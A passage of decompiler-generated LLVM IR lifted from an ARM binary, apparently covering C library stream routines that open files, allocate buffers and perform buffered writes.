  br i1 %v2_15f08, label %dec_label_pc_15f10, label %dec_label_pc_15f38

dec_label_pc_15f10:                               ; preds = %.thread3
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_15f14 = call i32 @function_12b00(i32 80)
  store i32 %v1_15f14, i32* %r0.global-to-local, align 4
  store i32 %v1_15f14, i32* @sb, align 4
  %v3_15f18 = icmp eq i32 %v1_15f14, 0
  br i1 %v3_15f18, label %dec_label_pc_1613c, label %dec_label_pc_15f20

dec_label_pc_15f20:                               ; preds = %dec_label_pc_15f10
  %v2_15f24 = add i32 %v1_15f14, 8
  %v3_15f24 = inttoptr i32 %v2_15f24 to i32*
  store i32 0, i32* %v3_15f24, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_15f2c = load i32, i32* @sb, align 4
  %v3_15f2c = inttoptr i32 %v2_15f2c to i16*
  store i16 8192, i16* %v3_15f2c, align 2
  %v0_15f30 = load i32, i32* @sb, align 4
  %v1_15f30 = add i32 %v0_15f30, 56
  store i32 %v1_15f30, i32* @r0, align 4
  %v1_15f34 = call i32 @function_10b0c(i32 %v1_15f30)
  store i32 %v1_15f34, i32* %r0.global-to-local, align 4
  %v0_15f38.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f38

dec_label_pc_15f38:                               ; preds = %.thread3, %dec_label_pc_15f20
  %v0_15f90 = phi i32 [ %v0_15e98, %.thread3 ], [ %v0_15f38.pre, %dec_label_pc_15f20 ]
  %v1_15f38 = icmp slt i32 %v0_15f90, 0
  br i1 %v1_15f38, label %dec_label_pc_15f90, label %dec_label_pc_15f40

dec_label_pc_15f40:                               ; preds = %dec_label_pc_15f38
  %v0_15f44 = load i32, i32* @r4, align 4
  %v2_15f44 = and i32 %v0_15f44, 131075
  %v1_15f48 = add nuw nsw i32 %v2_15f44, 1
  store i32 %v1_15f48, i32* %r2.global-to-local, align 4
  %v0_15f4c = load i32, i32* @r6, align 4
  %v1_15f4c = add i32 %v0_15f4c, 1
  %v2_15f50 = and i32 %v1_15f4c, %v1_15f48
  store i32 %v2_15f50, i32* %r3.global-to-local, align 4
  %v9_15f54 = icmp eq i32 %v2_15f50, %v1_15f48
  %v1_15f58 = load i32, i32* @sb, align 4
  %v2_15f58 = add i32 %v1_15f58, 4
  %v3_15f58 = inttoptr i32 %v2_15f58 to i32*
  store i32 %v0_15f90, i32* %v3_15f58, align 4
  br i1 %v9_15f54, label %dec_label_pc_15f60, label %dec_label_pc_15eb8

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f40
  %v0_15f60 = load i32, i32* @r4, align 4
  %v1_15f60 = load i32, i32* @r6, align 4
  %v2_15f60 = sub i32 -1, %v1_15f60
  %v3_15f60 = and i32 %v0_15f60, %v2_15f60
  store i32 %v3_15f60, i32* @r3, align 4
  %v1_15f64 = and i32 %v3_15f60, 1024
  %v2_15f64 = icmp eq i32 %v1_15f64, 0
  br i1 %v2_15f64, label %dec_label_pc_15f84, label %dec_label_pc_15f6c

dec_label_pc_15f6c:                               ; preds = %dec_label_pc_15f60
  %v0_15f6c = load i32, i32* @r5, align 4
  store i32 %v0_15f6c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_15f78 = call i32 @function_106d8(i32 %v0_15f6c, i32 4)
  store i32 %v2_15f78, i32* %r0.global-to-local, align 4
  %v2_15f7c = icmp eq i32 %v2_15f78, 0
  br i1 %v2_15f7c, label %dec_label_pc_15f6c.dec_label_pc_15f84_crit_edge, label %dec_label_pc_15eb8

dec_label_pc_15f6c.dec_label_pc_15f84_crit_edge:  ; preds = %dec_label_pc_15f6c
  %v0_15f84.pre = load i32, i32* @r6, align 4
  %v0_15f88.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f84

dec_label_pc_15f84:                               ; preds = %dec_label_pc_15f6c.dec_label_pc_15f84_crit_edge, %dec_label_pc_15f60
  %v0_15f88 = phi i32 [ %v0_15f88.pre, %dec_label_pc_15f6c.dec_label_pc_15f84_crit_edge ], [ %v0_15f60, %dec_label_pc_15f60 ]
  %v0_15f84 = phi i32 [ %v0_15f84.pre, %dec_label_pc_15f6c.dec_label_pc_15f84_crit_edge ], [ %v1_15f60, %dec_label_pc_15f60 ]
  %v1_15f84 = and i32 %v0_15f84, 131072
  store i32 %v1_15f84, i32* %r3.global-to-local, align 4
  %v2_15f88 = or i32 %v1_15f84, %v0_15f88
  store i32 %v2_15f88, i32* @r4, align 4
  br label %dec_label_pc_15fb4

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f38
  %v7_15f90 = icmp eq i32 %v0_15f90, -1
  %v0_15f9c.pre = load i32, i32* @r4, align 4
  br i1 %v7_15f90, label %dec_label_pc_15f90._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_15f90
  %v2_15f94 = or i32 %v0_15f9c.pre, 131072
  store i32 %v2_15f94, i32* @r4, align 4
  br label %dec_label_pc_15f90._crit_edge

dec_label_pc_15f90._crit_edge:                    ; preds = %dec_label_pc_15f90, %bb36
  %v0_15f9c = phi i32 [ %v2_15f94, %bb36 ], [ %v0_15f9c.pre, %dec_label_pc_15f90 ]
  %v0_15f98 = load i32, i32* @r6, align 4
  store i32 %v0_15f98, i32* %r0.global-to-local, align 4
  store i32 %v0_15f9c, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_15fa4 = call i32 @function_10474(i32 %v0_15f98, i32 %v0_15f9c)
  store i32 %v2_15fa4, i32* %r0.global-to-local, align 4
  %v1_15fa8 = icmp slt i32 %v2_15fa4, 0
  %v1_15fac = load i32, i32* @sb, align 4
  %v2_15fac = add i32 %v1_15fac, 4
  %v3_15fac = inttoptr i32 %v2_15fac to i32*
  store i32 %v2_15fa4, i32* %v3_15fac, align 4
  br i1 %v1_15fa8, label %dec_label_pc_15ecc, label %.dec_label_pc_15fb4_crit_edge

.dec_label_pc_15fb4_crit_edge:                    ; preds = %dec_label_pc_15f90._crit_edge
  %v0_15fb8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15fb4

dec_label_pc_15fb4:                               ; preds = %.dec_label_pc_15fb4_crit_edge, %dec_label_pc_15f84
  %v0_15fd0 = phi i32 [ %v0_15fb8.pre, %.dec_label_pc_15fb4_crit_edge ], [ %v2_15f88, %dec_label_pc_15f84 ]
  %v0_15fb4 = load i32, i32* @sb, align 4
  %v1_15fb4 = inttoptr i32 %v0_15fb4 to i16*
  %v2_15fb4 = load i16, i16* %v1_15fb4, align 2
  %v3_15fb4 = zext i16 %v2_15fb4 to i32
  %v1_15fb8 = urem i32 %v0_15fd0, 4
  %v1_15fbc = and i32 %v0_15fd0, 1024
  %v1_15fc0 = and i32 %v3_15fb4, 8192
  %v1_15fc4 = add nuw nsw i32 %v1_15fb8, 1
  %v2_15fc8 = or i32 %v1_15fc0, %v1_15fbc
  store i32 %v2_15fc8, i32* %r3.global-to-local, align 4
  %v1_15fcc = xor i32 %v1_15fc4, 3
  store i32 %v1_15fcc, i32* %r1.global-to-local, align 4
  %v1_15fd0 = and i32 %v0_15fd0, 131072
  store i32 %v1_15fd0, i32* %r2.global-to-local, align 4
  %v2_15fd0 = icmp eq i32 %v1_15fd0, 0
  %v1_15fd4 = add i32 %v0_15fb4, 4
  %v2_15fd4 = inttoptr i32 %v1_15fd4 to i32*
  %v3_15fd4 = load i32, i32* %v2_15fd4, align 4
  store i32 %v3_15fd4, i32* @r5, align 4
  br i1 %v2_15fd0, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_15fb4
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_15fb4, %bb37
  %v0_15fe0 = phi i32 [ 0, %dec_label_pc_15fb4 ], [ 32768, %bb37 ]
  %v4_15fdc = mul nuw nsw i32 %v1_15fcc, 16
  %v5_15fdc = or i32 %v2_15fc8, %v4_15fdc
  store i32 %v5_15fdc, i32* %r3.global-to-local, align 4
  %v2_15fe0 = or i32 %v0_15fe0, %v5_15fdc
  store i32 %v2_15fe0, i32* %r2.global-to-local, align 4
  %v8_15fe4 = icmp eq i32 %v3_15fd4, 2147483647
  %v1_15fe8 = trunc i32 %v2_15fe0 to i16
  store i16 %v1_15fe8, i16* %v1_15fb4, align 2
  br i1 %v8_15fe4, label %dec_label_pc_16018, label %dec_label_pc_15ff0

dec_label_pc_15ff0:                               ; preds = %bb38
  %v0_15ff0 = call i32 @function_1095c()
  store i32 %v0_15ff0, i32* @r4, align 4
  %v0_15ff8 = load i32, i32* @r5, align 4
  store i32 %v0_15ff8, i32* @r0, align 4
  %v1_15ffc = inttoptr i32 %v0_15ff0 to i32*
  %v2_15ffc = load i32, i32* %v1_15ffc, align 4
  store i32 %v2_15ffc, i32* @r5, align 4
  %v1_16000 = call i32 @function_12540(i32 %v0_15ff8)
  store i32 %v1_16000, i32* %r0.global-to-local, align 4
  %v2_16004 = icmp eq i32 %v1_16000, 0
  br i1 %v2_16004, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_15ff0
  %v1_16008 = load i32, i32* @sb, align 4
  %v2_16008 = inttoptr i32 %v1_16008 to i16*
  %v3_16008 = load i16, i16* %v2_16008, align 2
  %v4_16008 = zext i16 %v3_16008 to i32
  %v2_1600c = or i32 %v4_16008, 256
  store i32 %v2_1600c, i32* %r3.global-to-local, align 4
  %v2_16010 = trunc i32 %v2_1600c to i16
  store i16 %v2_16010, i16* %v2_16008, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15ff0, %bb39
  %v0_16014 = load i32, i32* @r5, align 4
  %v1_16014 = load i32, i32* @r4, align 4
  %v2_16014 = inttoptr i32 %v1_16014 to i32*
  store i32 %v0_16014, i32* %v2_16014, align 4
  br label %dec_label_pc_16018

dec_label_pc_16018:                               ; preds = %bb38, %.thread5
  %v0_16018 = load i32, i32* @sb, align 4
  %v1_16018 = add i32 %v0_16018, 8
  %v2_16018 = inttoptr i32 %v1_16018 to i32*
  %v3_16018 = load i32, i32* %v2_16018, align 4
  store i32 %v3_16018, i32* %r3.global-to-local, align 4
  %v2_1601c = icmp eq i32 %v3_16018, 0
  br i1 %v2_1601c, label %dec_label_pc_16024, label %bb40

dec_label_pc_16024:                               ; preds = %dec_label_pc_16018
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_16028 = call i32 @function_12b00(i32 4096)
  store i32 %v1_16028, i32* %r0.global-to-local, align 4
  %v2_1602c = icmp eq i32 %v1_16028, 0
  %v1_1603c.pre = load i32, i32* @sb, align 4
  br i1 %v2_1602c, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_16024
  %v2_16030 = inttoptr i32 %v1_1603c.pre to i16*
  %v3_16030 = load i16, i16* %v2_16030, align 2
  %v4_16030 = zext i16 %v3_16030 to i32
  %v2_16034 = add i32 %v1_16028, 4096
  store i32 %v2_16034, i32* %r2.global-to-local, align 4
  %v2_16038 = or i32 %v4_16030, 16384
  store i32 %v2_16038, i32* %r3.global-to-local, align 4
  %v2_1603c = add i32 %v1_1603c.pre, 8
  %v3_1603c = inttoptr i32 %v2_1603c to i32*
  store i32 %v1_16028, i32* %v3_1603c, align 4
  %v1_16040 = load i32, i32* %r2.global-to-local, align 4
  %v2_16040 = load i32, i32* @sb, align 4
  %v3_16040 = add i32 %v2_16040, 12
  %v4_16040 = inttoptr i32 %v3_16040 to i32*
  store i32 %v1_16040, i32* %v4_16040, align 4
  %v1_16044 = load i32, i32* %r3.global-to-local, align 4
  %v2_16044 = trunc i32 %v1_16044 to i16
  %v3_16044 = load i32, i32* @sb, align 4
  %v4_16044 = inttoptr i32 %v3_16044 to i16*
  store i16 %v2_16044, i16* %v4_16044, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_16024
  %v2_1603c19 = add i32 %v1_1603c.pre, 8
  %v3_1603c20 = inttoptr i32 %v2_1603c19 to i32*
  store i32 0, i32* %v3_1603c20, align 4
  %v2_16048 = load i32, i32* @sb, align 4
  %v3_16048 = add i32 %v2_16048, 12
  %v4_16048 = inttoptr i32 %v3_16048 to i32*
  store i32 0, i32* %v4_16048, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_16018, %.thread9
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_16054 = load i32, i32* @fp, align 4
  %v2_16054 = add i32 %v0_16054, 60
  %v3_16054 = inttoptr i32 %v2_16054 to i32*
  %v4_16054 = load i32, i32* %v3_16054, align 4
  store i32 %v4_16054, i32* %r3.global-to-local, align 4
  %v2_16058 = load i32, i32* @sb, align 4
  %v3_16058 = add i32 %v2_16058, 2
  %v4_16058 = inttoptr i32 %v3_16058 to i8*
  store i8 0, i8* %v4_16058, align 1
  %v0_1605c = load i32, i32* @sb, align 4
  %v1_1605c = inttoptr i32 %v0_1605c to i16*
  %v2_1605c = load i16, i16* %v1_1605c, align 2
  %v3_1605c = zext i16 %v2_1605c to i32
  store i32 %v3_1605c, i32* %r2.global-to-local, align 4
  %v0_16060 = load i32, i32* %r3.global-to-local, align 4
  %v1_16060 = inttoptr i32 %v0_16060 to i32*
  %v2_16060 = load i32, i32* %v1_16060, align 4
  store i32 %v2_16060, i32* %r1.global-to-local, align 4
  %v1_16064 = add i32 %v0_1605c, 8
  %v2_16064 = inttoptr i32 %v1_16064 to i32*
  %v3_16064 = load i32, i32* %v2_16064, align 4
  store i32 %v3_16064, i32* %r3.global-to-local, align 4
  %v1_16068 = and i32 %v3_1605c, 8192
  %v2_16068 = icmp eq i32 %v1_16068, 0
  %v2_1606c = add i32 %v0_1605c, 20
  %v3_1606c = inttoptr i32 %v2_1606c to i32*
  store i32 %v3_16064, i32* %v3_1606c, align 4
  %v0_16070 = load i32, i32* %r0.global-to-local, align 4
  %v1_16070 = load i32, i32* @sb, align 4
  %v2_16070 = add i32 %v1_16070, 44
  %v3_16070 = inttoptr i32 %v2_16070 to i32*
  store i32 %v0_16070, i32* %v3_16070, align 4
  %v0_16074 = load i32, i32* %r1.global-to-local, align 4
  %v1_16074 = load i32, i32* @sb, align 4
  %v2_16074 = add i32 %v1_16074, 52
  %v3_16074 = inttoptr i32 %v2_16074 to i32*
  store i32 %v0_16074, i32* %v3_16074, align 4
  %v0_16078 = load i32, i32* %r3.global-to-local, align 4
  %v1_16078 = load i32, i32* @sb, align 4
  %v2_16078 = add i32 %v1_16078, 24
  %v3_16078 = inttoptr i32 %v2_16078 to i32*
  store i32 %v0_16078, i32* %v3_16078, align 4
  %v0_1607c = load i32, i32* %r3.global-to-local, align 4
  %v1_1607c = load i32, i32* @sb, align 4
  %v2_1607c = add i32 %v1_1607c, 28
  %v3_1607c = inttoptr i32 %v2_1607c to i32*
  store i32 %v0_1607c, i32* %v3_1607c, align 4
  %v0_16080 = load i32, i32* %r3.global-to-local, align 4
  %v1_16080 = load i32, i32* @sb, align 4
  %v2_16080 = add i32 %v1_16080, 16
  %v3_16080 = inttoptr i32 %v2_16080 to i32*
  store i32 %v0_16080, i32* %v3_16080, align 4
  br i1 %v2_16068, label %dec_label_pc_1613c, label %dec_label_pc_16088

dec_label_pc_16088:                               ; preds = %bb40
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_1608c = load i32, i32* @fp, align 4
  %v2_1608c = add i32 %v0_1608c, 40
  %v3_1608c = inttoptr i32 %v2_1608c to i32*
  %v4_1608c = load i32, i32* %v3_1608c, align 4
  store i32 %v4_1608c, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_16094 = add i32 %v0_1608c, 112
  %v3_16094 = inttoptr i32 %v2_16094 to i32*
  %v4_16094 = load i32, i32* %v3_16094, align 4
  store i32 %v4_16094, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1609c = ptrtoint i32* %stack_var_-56 to i32
  %v2_160a0 = add i32 %v0_1608c, 76
  %v3_160a0 = inttoptr i32 %v2_160a0 to i32*
  %v4_160a0 = load i32, i32* %v3_160a0, align 4
  store i32 %v4_1608c, i32* %r1.global-to-local, align 4
  store i32 %v4_16094, i32* %r2.global-to-local, align 4
  store i32 %v2_1609c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_160a0)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_160bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_160bc, i32* %r0.global-to-local, align 4
  %v0_160c0 = load i32, i32* @fp, align 4
  %v2_160c0 = add i32 %v0_160c0, 20
  %v3_160c0 = inttoptr i32 %v2_160c0 to i32*
  %v4_160c0 = load i32, i32* %v3_160c0, align 4
  call void @__pseudo_branch(i32 %v4_160c0)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_160d0 = load i32, i32* @fp, align 4
  %v2_160d0 = add i32 %v0_160d0, 100
  %v3_160d0 = inttoptr i32 %v2_160d0 to i32*
  %v4_160d0 = load i32, i32* %v3_160d0, align 4
  store i32 %v4_160d0, i32* %r4.global-to-local, align 4
  %v0_160d4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_160d4, i32* %r1.global-to-local, align 4
  store i32 %v4_160d0, i32* %r2.global-to-local, align 4
  store i32 %v2_15e8c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_160a0)
  store i32 %v4_160d0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_160c0)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_160f8 = load i32, i32* @fp, align 4
  %v2_160f8 = add i32 %v0_160f8, 48
  %v3_160f8 = inttoptr i32 %v2_160f8 to i32*
  %v4_160f8 = load i32, i32* %v3_160f8, align 4
  store i32 %v4_160f8, i32* @ip, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v1_16100 = inttoptr i32 %v4_160f8 to i32*
  %v2_16100 = load i32, i32* %v1_16100, align 4
  store i32 %v2_16100, i32* %r2.global-to-local, align 4
  store i32 %v2_15e8c, i32* %r0.global-to-local, align 4
  %v1_16108 = load i32, i32* @sb, align 4
  %v2_16108 = add i32 %v1_16108, 32
  %v3_16108 = inttoptr i32 %v2_16108 to i32*
  store i32 %v2_16100, i32* %v3_16108, align 4
  %v0_1610c = load i32, i32* @fp, align 4
  %v1_1610c = load i32, i32* %r3.global-to-local, align 4
  %v2_1610c = add i32 %v1_1610c, %v0_1610c
  %v3_1610c = inttoptr i32 %v2_1610c to i32*
  %v4_1610c = load i32, i32* %v3_1610c, align 4
  store i32 %v4_1610c, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16114 = load i32, i32* @sb, align 4
  %v1_16114 = load i32, i32* @ip, align 4
  %v2_16114 = inttoptr i32 %v1_16114 to i32*
  store i32 %v0_16114, i32* %v2_16114, align 4
  call void @__pseudo_branch(i32 %v4_1610c)
  store i32 %v2_1609c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1610c)
  br label %dec_label_pc_1613c

dec_label_pc_16138:                               ; preds = %dec_label_pc_15ecc, %dec_label_pc_15eb8, %dec_label_pc_15ed8
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_1613c

dec_label_pc_1613c:                               ; preds = %bb40, %dec_label_pc_15f10, %dec_label_pc_16088, %dec_label_pc_16138
  %v0_1613c = load i32, i32* @sb, align 4
  store i32 %v0_1613c, i32* %r0.global-to-local, align 4
  %v2_16144 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16144, i32* %r4.global-to-local, align 4
  store i32 %v6_15e78, i32* @r5, align 4
  store i32 %v9_15e78, i32* @r6, align 4
  store i32 %v18_15e78, i32* @sb, align 4
  store i32 %v24_15e78, i32* @fp, align 4
  ret i32 %v0_1613c

; uselistorder directives
  uselistorder i32 %v1_1603c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_15fd0, { 1, 2, 0 }
  uselistorder i32 %v0_15f9c, { 1, 0 }
  uselistorder i32 %v1_15f60, { 1, 0 }
  uselistorder i32 %v0_15f60, { 1, 0 }
  uselistorder i32 %v1_15f48, { 1, 0, 2 }
  uselistorder i32 %v1_15f00, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 20, 17, 16, 18, 19 }
  uselistorder i32 16384, { 15, 14, 0, 1, 9, 6, 7, 8, 4, 5, 2, 3, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @function_12540, { 2, 1, 0 }
  uselistorder i32 2147483647, { 0, 1, 6, 2, 5, 3, 4 }
  uselistorder i32 (i32, i32)* @function_10474, { 4, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_106d8, { 13, 14, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1613c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_16138, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16018, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_15f90._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15f38, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15ee8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15eb8, { 1, 2, 0 }
}

define i32 @function_16150(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16150:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_16150 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16150, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_16150
  %v3_16158 = and i32 %arg4, %arg3
  %v2_1615c = trunc i32 %v3_16158 to i16
  %v4_1615c = inttoptr i32 %v3_16158 to i16*
  store i16 %v2_1615c, i16* %v4_1615c, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_16150, %bb
  %v10_1617c = phi i32 [ %tmp, %dec_label_pc_16150 ], [ 0, %bb ]
  ret i32 %v10_1617c

; uselistorder directives
  uselistorder i32 %v3_16158, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_16180(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_16180:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_16180 = load i32, i32* @r4, align 4
  store i32 %v3_16180, i32* %stack_var_-20, align 4
  %v6_16180 = load i32, i32* @r5, align 4
  %v9_16180 = load i32, i32* @r6, align 4
  %v12_16180 = load i32, i32* @r7, align 4
  %v3_16184 = load i16, i16* %arg3, align 2
  %v4_16184 = zext i16 %v3_16184 to i32
  %v1_16188 = and i32 %v4_16184, 512
  store i32 %v1_16188, i32* @r4, align 4
  %v2_16188 = icmp eq i32 %v1_16188, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_16188, label %dec_label_pc_161a0, label %dec_label_pc_1629c

dec_label_pc_161a0:                               ; preds = %dec_label_pc_16180
  %v2_161a0 = add i32 %tmp, 4
  %v3_161a0 = inttoptr i32 %v2_161a0 to i32*
  %v4_161a0 = load i32, i32* %v3_161a0, align 4
  %v2_161a8 = add i32 %tmp, 16
  %v3_161a8 = inttoptr i32 %v2_161a8 to i32*
  %v4_161a8 = load i32, i32* %v3_161a8, align 4
  store i32 %v4_161a8, i32* @r0, align 4
  %v2_161ac = add i32 %tmp, 12
  %v3_161ac = inttoptr i32 %v2_161ac to i32*
  %v4_161ac = load i32, i32* %v3_161ac, align 4
  store i32 %v4_161ac, i32* @r3, align 4
  %v4_161b0 = icmp eq i32 %v4_161a0, -2
  %v2_161b4 = sub i32 %v4_161ac, %v4_161a8
  br i1 %v4_161b0, label %dec_label_pc_161b4, label %dec_label_pc_161dc

dec_label_pc_161b4:                               ; preds = %dec_label_pc_161a0
  %v3_161b8 = icmp ugt i32 %v2_161b4, %arg2
  br i1 %v3_161b8, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_161b4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_161b4, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_161b4, %dec_label_pc_161b4 ]
  %v0_161c0 = phi i32 [ %arg2, %bb ], [ %v2_161b4, %dec_label_pc_161b4 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_161c0, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_161c8 = call i32 @function_12050()
  %v0_161cc = load i32, i32* @r5, align 4
  %v1_161cc = add i32 %v0_161cc, 16
  %v2_161cc = inttoptr i32 %v1_161cc to i32*
  %v3_161cc = load i32, i32* %v2_161cc, align 4
  %v1_161d0 = load i32, i32* @r4, align 4
  %v2_161d0 = add i32 %v1_161d0, %v3_161cc
  store i32 %v2_161d0, i32* %v2_161cc, align 4
  br label %dec_label_pc_162b0

dec_label_pc_161dc:                               ; preds = %dec_label_pc_161a0
  store i32 %v2_161b4, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_161b4, %arg2
  br i1 %tmp18, label %dec_label_pc_1627c, label %dec_label_pc_161e8

dec_label_pc_161e8:                               ; preds = %dec_label_pc_161dc
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_161f0 = call i32 @function_12050()
  %v0_161f4 = load i32, i32* @r5, align 4
  %v1_161f4 = add i32 %v0_161f4, 16
  %v2_161f4 = inttoptr i32 %v1_161f4 to i32*
  %v3_161f4 = load i32, i32* %v2_161f4, align 4
  %v1_161f8 = inttoptr i32 %v0_161f4 to i16*
  %v2_161f8 = load i16, i16* %v1_161f8, align 2
  %v1_161fc = load i32, i32* @r6, align 4
  %v2_161fc = add i32 %v1_161fc, %v3_161f4
  %v1_16200 = and i16 %v2_161f8, 256
  %v2_16200 = icmp eq i16 %v1_16200, 0
  store i32 %v2_161fc, i32* %v2_161f4, align 4
  br i1 %v2_16200, label %dec_label_pc_162b0, label %dec_label_pc_1620c

dec_label_pc_1620c:                               ; preds = %dec_label_pc_161e8
  %v0_1620c = load i32, i32* @r7, align 4
  %v0_16214 = load i32, i32* @r6, align 4
  %v4_16218 = call i32 @function_17b6c(i32 %v0_1620c, i32 10, i32 %v0_16214, i32 %v2_161fc)
  %v2_1621c = icmp eq i32 %v4_16218, 0
  br i1 %v2_1621c, label %dec_label_pc_162b0, label %dec_label_pc_16224

dec_label_pc_16224:                               ; preds = %dec_label_pc_1620c
  %v0_16224 = load i32, i32* @r5, align 4
  store i32 %v0_16224, i32* @r0, align 4
  %v0_16228 = call i32 @function_10c14()
  %v2_1622c = icmp eq i32 %v0_16228, 0
  br i1 %v2_1622c, label %dec_label_pc_162b0, label %dec_label_pc_16234

dec_label_pc_16234:                               ; preds = %dec_label_pc_16224
  %v1_16234 = load i32, i32* @r6, align 4
  %v3_16234 = icmp uge i32 %v0_16228, %v1_16234
  %v1_16234.v0_16228 = select i1 %v3_16234, i32 %v1_16234, i32 %v0_16228
  store i32 %v1_16234.v0_16228, i32* @r4, align 4
  %v2_16240 = sub i32 %v1_16234, %v1_16234.v0_16228
  %v0_16244 = load i32, i32* @r7, align 4
  %v2_16244 = add i32 %v0_16244, %v2_16240
  store i32 %v2_16244, i32* %r7.global-to-local, align 4
  store i32 %v2_16244, i32* @r0, align 4
  store i32 %v1_16234.v0_16228, i32* @r2, align 4
  %v4_16254 = call i32 @function_17910(i32 %v2_16244, i32 10, i32 %v1_16234.v0_16228, i32 %v2_16240)
  %v2_16258 = icmp eq i32 %v4_16254, 0
  br i1 %v2_16258, label %dec_label_pc_162b0, label %dec_label_pc_16260

dec_label_pc_16260:                               ; preds = %dec_label_pc_16234
  %v0_16260 = load i32, i32* @r5, align 4
  %v1_16260 = add i32 %v0_16260, 16
  %v2_16260 = inttoptr i32 %v1_16260 to i32*
  %v3_16260 = load i32, i32* %v2_16260, align 4
  %v0_16264 = load i32, i32* %r7.global-to-local, align 4
  %v1_16264 = load i32, i32* @r4, align 4
  %v2_16264 = sub i32 %v0_16264, %v4_16254
  %v2_16268 = add i32 %v2_16264, %v1_16264
  %v2_1626c = sub i32 %v3_16260, %v2_16268
  %v1_16270 = load i32, i32* @r6, align 4
  %v2_16270 = sub i32 %v1_16270, %v2_16268
  store i32 %v2_16270, i32* @r6, align 4
  store i32 %v2_1626c, i32* %v2_16260, align 4
  br label %dec_label_pc_162b0

dec_label_pc_1627c:                               ; preds = %dec_label_pc_161dc
  %v2_1627c = add i32 %tmp, 8
  %v3_1627c = inttoptr i32 %v2_1627c to i32*
  %v4_1627c = load i32, i32* %v3_1627c, align 4
  %v9_16280 = icmp eq i32 %v4_161a8, %v4_1627c
  br i1 %v9_16280, label %dec_label_pc_1629c, label %dec_label_pc_16288

dec_label_pc_16288:                               ; preds = %dec_label_pc_1627c
  store i32 %tmp, i32* @r0, align 4
  %v0_1628c = call i32 @function_10c14()
  %v2_16290 = icmp eq i32 %v0_1628c, 0
  br i1 %v2_16290, label %dec_label_pc_16288.dec_label_pc_1629c_crit_edge, label %bb15

